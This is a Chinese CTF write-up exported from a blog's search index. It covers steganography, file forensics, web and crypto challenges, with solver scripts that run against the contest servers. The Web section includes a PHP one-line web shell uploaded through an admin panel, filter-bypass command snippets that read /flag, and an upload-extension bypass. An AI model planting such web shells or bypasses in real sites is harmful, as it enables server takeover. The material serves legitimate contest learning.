<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>wp</title>
    <link href="/2025/03/24/wp/"/>
    <url>/2025/03/24/wp/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a><strong>ez_jpg</strong></h3><p>Base64解码，开头为9DFF，反过来为FFD9，是jpg的文件尾</p><img src="file:///D:\Blog\source\images\屏幕截图 2025-03-01 192434.png" alt="img" style="zoom:50%;" /> <p>使用反转工具</p><img src="file:///D:\Blog\source\images\屏幕截图 2025-03-01 200409.png" alt="img" style="zoom: 50%;" /> <p>导入到010</p><p><img src="file:///D:\Blog\source\images\屏幕截图 2025-03-01 193807.png" alt="img" style="zoom:50%;" />        <img src="file:///D:\Blog\source\images\图片1.png" alt="img" style="zoom: 67%;" /></p><p>修改宽高</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps5.jpg" alt="img"> </p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps6.png" alt="img"> </p><p>SYC{Steg_4nd_Zip_1s_G00d!}</p><h3 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a><strong>Truth of Word</strong></h3><p>（1）</p><img src="file:///D:\Blog\source\images\屏幕截图 2025-03-01 202053.png" alt="img" style="zoom: 67%;" /> <p>Flag01&#x3D;SYC{W0rd_H@5</p><p>（2）</p><p>改后缀名，.docx改为.zip</p><img src="file:///D:\Blog\source\images\屏幕截图 2025-03-02 152005.png" alt="img" style="zoom:67%;" /> <p>.bin文件，改后缀为zip</p><img src="file:///D:\Blog\source\images\屏幕截图 2025-03-02 151931.png" alt="img" style="zoom: 67%;" /> <img src="file:///D:\Blog\source\images\屏幕截图 2025-03-01 202908.png" alt="img" style="zoom: 67%;" /> <p>Flag02 &#x3D; @<em>Ama1n9</em>  </p><p>（3）</p><p><img src="file:///D:\Blog\source\images\屏幕截图 2025-03-01 201853.png" alt="img" style="zoom:67%;" />      <img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps12.jpg" alt="img"> </p><p> FLAG03&#x3D;StrUCtu3e!}</p><p>SYC{W0rd_H@5@_Ama1n9_StrUCtu3e!}</p><h3 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a><strong>ez_pcap_1</strong></h3><p>SMB文件</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps13.jpg" alt="img"> </p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps14.jpg" alt="img"> </p><h3 id="雪"><a href="#雪" class="headerlink" title="雪"></a><strong>雪</strong></h3><p>zip拖进010</p><img src="file:///D:\Blog\source\images\屏幕截图 2025-03-04 220739.png" alt="img" style="zoom:67%;" /> <p>base64解码  W3LC0M4</p><p>盲水印提取</p><img src="file:///D:\Blog\source\images\屏幕截图 2025-03-04 190323.png" alt="img" style="zoom:67%;" /> <p>Th1si4st8eK3y</p><p>随波逐流，雪花隐写</p><p>![img](file:&#x2F;&#x2F;&#x2F;D:\Blog\source\images\屏幕截图 2025-03-04 220857.png) </p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps18.jpg" alt="img"> </p><h3 id="舔狗的觉醒"><a href="#舔狗的觉醒" class="headerlink" title="舔狗的觉醒"></a><strong>舔狗的觉醒</strong></h3><p>密码爆破</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps19.jpg" alt="img"> </p><p>50 4b 03 04是zip的文件头</p><p>每两位左右交换</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps20.jpg" alt="img"> </p><p>脚本</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps21.jpg" alt="img"> </p><p>得到pdf文件</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps22.jpg" alt="img"> </p><p>把图片拖走</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps23.jpg" alt="img"> </p><p>SYC{Y0u_arE_y0uR_0wn_hero}</p><h3 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a><strong>cimbar</strong></h3><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps24.jpg" alt="img">![img](file:&#x2F;&#x2F;&#x2F;D:\Blog\source\images\屏幕截图 2025-03-03 212556.png) </p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps26.jpg" alt="img"> </p><h3 id="乌龟"><a href="#乌龟" class="headerlink" title="乌龟"></a><strong>乌龟</strong></h3><p>SSTV扫描，得到图片</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps27.jpg" alt="img"> </p><p>PASS:Be4uti7ulSun5e7密钥</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps28.jpg" alt="img"> </p><p>得到serect.txt</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps29.jpg" alt="img"> </p><p>看不懂，问AI，这段代码是用 Logo 语言编写的</p><p>找一个在线工具</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps30.jpg" alt="img"> </p><p>SYC{TU3T1E_P4INTING}</p><h3 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a><strong>Welcome_jail</strong></h3><h3 id="史上最没节操的游戏"><a href="#史上最没节操的游戏" class="headerlink" title="史上最没节操的游戏"></a><strong>史上最没节操的游戏</strong></h3><p>电影院：</p><p>音频里有电报声，用AU分离</p><p>去bilibili下载原音频，</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps31.jpg" alt="img"> </p><p>反相</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps32.jpg" alt="img"> </p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps33.jpg" alt="img"> </p><p>访问<a href="https://www.cnblogs.com/handsomesnowsword">https://www.cnblogs.com/handsomesnowsword</a></p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps34.jpg" alt="img"> </p><p>_YPneR:2galf</p><p>flag2:RenPY_</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="100-的圆"><a href="#100-的圆" class="headerlink" title="100%的圆"></a><strong>100%的圆</strong></h3><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps35.jpg" alt="img"> </p><p>Base64解码</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps36.jpg" alt="img"> </p><h3 id="ez-http"><a href="#ez-http" class="headerlink" title="ez-http"></a><strong>ez-http</strong></h3><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps37.jpg" alt="img"> </p><p>cookie用了JWT加密，hasFlag为 false，需要将其改为true</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps38.jpg" alt="img"> </p><p>AI脚本</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps39.jpg" alt="img"> </p><h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload*"></a><strong>baby_upload</strong>*</h3><p>白名单后缀绕过，只对第一个后缀名进行了黑名单检测</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps40.jpg" alt="img"> </p><p>返回为空，上传成功</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps41.jpg" alt="img"> </p><p>蚁剑访问</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps42.jpg" alt="img"> </p><h3 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a><strong>SecretInDrivingSchool</strong></h3><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps43.jpg" alt="img"> </p><p>访问&#x2F;L000G1n.php</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps44.jpg" alt="img">密码猜是SYC….</p><p>进入后台，广告修改，传个一句话木马</p><?phpassert($_REQUEST['cmd']);?><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps45.jpg" alt="img"> </p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps46.jpg" alt="img"> </p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps47.jpg" alt="img"> </p><p>或</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps48.jpg" alt="img"> </p><p>或</p><p>字符串拼接起来执行就能绕过</p><p>$a &#x3D; ‘syst’ . ‘em’;</p><p>$a(‘env’);</p><p>或</p><p>echo readgzfile(“&#x2F;flag”);  &#x2F;&#x2F;readgzfile 函数会尝试打开并读取指定路径的 gzip 压缩文件，然后把文件内容输出到标准输出（通常是浏览器页面）。</p><p>或</p><p>过滤了eval，system，用 <code> </code> 执行系统命令</p><p>echo <code>cat /flag</code>;</p><h3 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a><strong>Problem_On_My_Web</strong></h3><p>当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps49.jpg" alt="img"> </p><p>intval函数不能正常解析字符串形式的科学表达式，会返回底数，传year&#x3D;2023e2，intval($year)解析字符串’2023e2’返回1，过第一个条件，后面的是$year+1,数字和字符串相加，php会把字符串转为数字再相加，所以就会被解析为2023*2023</p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps50.jpg" alt="img"> </p><p><img src="file:///C:\Users\31626\AppData\Local\Temp\ksohtml20424\wps51.jpg" alt="img"> </p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a><strong>凯撒加密</strong></h3><p>![img](file:&#x2F;&#x2F;&#x2F;D:\Blog\source\images\屏幕截图 2025-03-01 201210.png) </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a><strong>RSA</strong></h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from Crypto.Util.number import *<br><br>n = 33108009203593648507706487693709965711774665216872550007309537128959455938833<br>p = 192173332221883349384646293941837353967<br>q = 172282016556631997385463935089230918399<br>e = 65537<br>c = 5366332878961364744687912786162467698377615956518615197391990327680664213847<br><br>phi_n = (p - 1) * (q - 1)<br>d = inverse(e, phi_n)<br>m = pow(c, d, n)<br><br>flag_bytes = long_to_bytes(m)<br>flag = flag_bytes.decode(&#x27;utf-8&#x27;)<br>print(flag)<br></code></pre></td></tr></table></figure><p><img src="C:\Users\31626\AppData\Roaming\Typora\typora-user-images\image-20250322212139170.png" alt="image-20250322212139170"></p><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a><strong>共模攻击</strong></h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">from</span> Crypto.Util.number <span class="hljs-meta">import</span> *<br><br>n = <span class="hljs-number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span><br><span class="hljs-symbol">e1</span> = <span class="hljs-number">911</span><br><span class="hljs-symbol">e2</span> = <span class="hljs-number">967</span><br><span class="hljs-symbol">c1</span> = <span class="hljs-number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span><br><span class="hljs-symbol">c2</span> = <span class="hljs-number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span><br><br><span class="hljs-symbol">def</span> extended_gcd(a, b):<br>    <span class="hljs-meta">if</span> a == <span class="hljs-number">0</span>:<br>        return (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br><span class="hljs-symbol">    else:</span><br>        g, y, x = extended_gcd(<span class="hljs-keyword">b</span> % a, a)<br>        return (g, x - (<span class="hljs-keyword">b</span> <span class="hljs-comment">// a) * y, y)</span><br><br>g, <span class="hljs-built_in">s1</span>, <span class="hljs-built_in">s2</span> = extended_gcd(e1, e2)<br><br><span class="hljs-symbol">if</span> <span class="hljs-built_in">s1</span> &lt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">s1</span> = -<span class="hljs-built_in">s1</span><br>    <span class="hljs-built_in">c1</span> = inverse(<span class="hljs-built_in">c1</span>, n)<br><span class="hljs-symbol">if</span> <span class="hljs-built_in">s2</span> &lt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">s2</span> = -<span class="hljs-built_in">s2</span><br>    <span class="hljs-built_in">c2</span> = inverse(<span class="hljs-built_in">c2</span>, n)<br><br>m = pow(<span class="hljs-built_in">c1</span>, <span class="hljs-built_in">s1</span>, n) * pow(<span class="hljs-built_in">c2</span>, <span class="hljs-built_in">s2</span>, n) % n<br><br><span class="hljs-symbol">flag</span> = long_to_bytes(m)<br><span class="hljs-symbol">print</span>(flag.decode())<br></code></pre></td></tr></table></figure><p><img src="C:\Users\31626\AppData\Roaming\Typora\typora-user-images\image-20250322212248839.png" alt="image-20250322212248839"></p><h3 id="ECBpad"><a href="#ECBpad" class="headerlink" title="ECBpad"></a><strong>ECBpad</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>r=remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">37297</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">leng</span>):<br>    pad_len = block - (leng % block) <span class="hljs-keyword">if</span>  leng % block != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;F&#x27;</span> * pad_len<br><br>secret_len = <span class="hljs-number">31</span><br>ori_padding_len = <span class="hljs-number">1</span><br>block = <span class="hljs-number">16</span><br>flag = <span class="hljs-string">b&#x27;&#x27;</span><br><br>padding = [pad(k) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>padding = padding[<span class="hljs-number">1</span>:]+[padding[<span class="hljs-number">0</span>]]<br><span class="hljs-built_in">print</span>(padding)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(secret_len):<br>    find=<span class="hljs-number">0</span><br>    payload = <span class="hljs-string">b&#x27;*&#x27;</span>*(ori_padding_len+i+<span class="hljs-number">1</span>)<br><br>    group = i//block<br>    r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,payload)<br>    r.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>    data = r.recvline().strip()<br>    <span class="hljs-keyword">if</span> group == <span class="hljs-number">0</span>:<br>        prob=data[-<span class="hljs-number">32</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        prob=(data[-<span class="hljs-number">32</span>*(group+<span class="hljs-number">1</span>):-<span class="hljs-number">32</span>*(group+<span class="hljs-number">1</span>)+<span class="hljs-number">32</span>])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span> prob = <span class="hljs-subst">&#123;prob&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> trange(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>        flag_suffix = flag[:<span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">15</span>)]<br>        payload = <span class="hljs-built_in">bytes</span>([j]) + flag_suffix + padding[<span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(flag_suffix),<span class="hljs-number">15</span>)]<br>        <span class="hljs-comment">#print(j,payload)</span><br>        r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,payload)<br>        r.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>        data = r.recvline().strip()<br>        <span class="hljs-keyword">if</span> data[:<span class="hljs-number">32</span>]==prob:<br>            flag = <span class="hljs-built_in">bytes</span>([j]) + flag<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span> flag = <span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>()<br>            find=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> find == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span> cannot find!&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br><br>r.interactive()<br></code></pre></td></tr></table></figure><p><img src="C:\Users\31626\AppData\Roaming\Typora\typora-user-images\image-20250322212614555.png" alt="image-20250322212614555"></p><h3 id="X0R"><a href="#X0R" class="headerlink" title="X0R"></a><strong>X0R</strong></h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from Crypto.Util.number import *<br>from pwn import xor<br><br><span class="hljs-comment"># 已知的加密结果</span><br>e2 = 10706859949950921239354880312196039515724907<br>f1 = 4585958212176920650644941909171976689111990<br>f2 = 3062959364761961602614252587049328627114908<br><br><span class="hljs-comment"># 逆向计算 enc</span><br>e1 = e2 ^ f2<br>enc = e1 ^ f1<br><br><span class="hljs-comment"># 将 enc 转换为字节对象</span><br>enc_bytes = long_to_bytes(enc)<br><br><span class="hljs-comment"># 已知 flag 前缀为 SYC&#123;</span><br>prefix = b&#x27;SYC&#123;&#x27;<br><br><span class="hljs-comment"># 计算 key</span><br>key = xor(prefix, enc_bytes[:len(prefix)])<br><br><span class="hljs-comment"># 确保 key 长度为 4</span><br>assert len(key) == 4<br><br><span class="hljs-comment"># 解密 flag</span><br>flag = xor(enc_bytes, key)<br><br><span class="hljs-section">print(&quot;Flag:&quot;, flag.decode())</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\31626\AppData\Roaming\Typora\typora-user-images\image-20250322212828140.png" alt="image-20250322212828140"></p><h3 id="dp"><a href="#dp" class="headerlink" title="dp"></a><strong>dp</strong></h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import long_to_bytes<br><br><span class="hljs-comment"># 已知参数</span><br><span class="hljs-attribute">c</span> = <span class="hljs-number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span><br><span class="hljs-attribute">n</span> = <span class="hljs-number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span><br><span class="hljs-attribute">dp</span> = <span class="hljs-number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span><br><br><span class="hljs-comment"># 恢复p</span><br><span class="hljs-attribute">for</span> k in range(<span class="hljs-number">1</span>, e):<br>    <span class="hljs-attribute">if</span> (dp * e - <span class="hljs-number">1</span>) % k == <span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">hp</span> = (dp * e - <span class="hljs-number">1</span>) // k + <span class="hljs-number">1</span><br>        <span class="hljs-attribute">if</span> n % hp == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">p</span> = hp<br>            <span class="hljs-attribute">q</span> = n // p<br>            <span class="hljs-attribute">break</span><br><br><span class="hljs-comment"># 计算私钥d</span><br><span class="hljs-attribute">phi</span> = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><span class="hljs-attribute">d</span> = pow(e, -<span class="hljs-number">1</span>, phi)<br><br><span class="hljs-comment"># 解密得到明文m</span><br><span class="hljs-attribute">m</span> = pow(c, d, n)<br><br><span class="hljs-comment"># 将明文转换为字节串</span><br><span class="hljs-attribute">flag</span> = long_to_bytes(m)<br><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag.decode())<br></code></pre></td></tr></table></figure><p><img src="C:\Users\31626\AppData\Roaming\Typora\typora-user-images\image-20250322212943231.png" alt="image-20250322212943231"></p><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a><strong>nc</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br>io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="hljs-number">19417</span>)<br>l = string.ascii_letters + string.digits<br>con = io.recvuntil(<span class="hljs-string">b&quot;XXXX: &quot;</span>).decode()<br><span class="hljs-comment"># print(con)</span><br><br>p2 = re.findall(<span class="hljs-string">r&#x27;sha256\(XXXX\+(.*)\)&#x27;</span>, con)[<span class="hljs-number">0</span>]<br>ss = re.findall(<span class="hljs-string">r&#x27;== (.*)&#x27;</span>, con)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]<br><span class="hljs-built_in">print</span>(p2)<br><span class="hljs-built_in">print</span>(ss)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> l:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> l:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> l:<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> l:<br>                p1 = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span><span class="hljs-subst">&#123;b&#125;</span><span class="hljs-subst">&#123;c&#125;</span><span class="hljs-subst">&#123;d&#125;</span>&#x27;</span><br>                proof = p1 + p2<br>                con = <span class="hljs-string">&#x27;b615cbae&#x27;</span><br>                xxx = hexdigest = sha256(proof.encode()).hexdigest()<br>                <span class="hljs-keyword">if</span> xxx[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>] == ss:<br>                    ss = p1<br>                    <span class="hljs-built_in">print</span>(p1)<br>s1 = ss.encode()<br>io.sendline(s1)<br><span class="hljs-comment"># io.sendafter(b&#x27;[-] &#x27;,1)</span><br>re2 = io.recvuntil(<span class="hljs-string">b&#x27;[-] &#x27;</span>).decode()<br>io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">33</span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;[-] &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>    re4 = io.recv().decode()<br>    flag += re4.replace(<span class="hljs-string">&#x27;[+] &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;S&#x27;</span> + flag)<br></code></pre></td></tr></table></figure><p><img src="C:\Users\31626\AppData\Roaming\Typora\typora-user-images\image-20250322213658339.png" alt="image-20250322213658339"></p>]]></content>
    
    
    
